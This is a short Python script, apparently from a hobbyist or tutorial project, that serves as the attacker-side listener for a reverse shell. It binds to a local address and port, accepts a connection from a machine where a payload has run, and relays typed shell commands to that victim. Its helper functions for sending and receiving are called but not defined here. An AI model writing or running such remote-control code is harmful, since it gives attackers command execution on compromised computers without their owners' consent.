# this code is for the server which will control the attack

import socket

# AF_INET tells about use of IPv4 and SOCK_STREAM tell about using TCP for communication
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

sock.bind(('192.168.122.131', 5555)) #binding ip address with the port

# to listen for incoming connections after the payload has been executed
print('[+] Listening For Incoming Connections')
sock.listen(5)

# now storing info for the connected connection
target , ip = sock.accept()
print('[+] Connection Established From: ' + str(ip))

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        send(command)
        if command == 'exit':
            break
        else:
            result = recv()
            print(result)
            
    


target_communication()









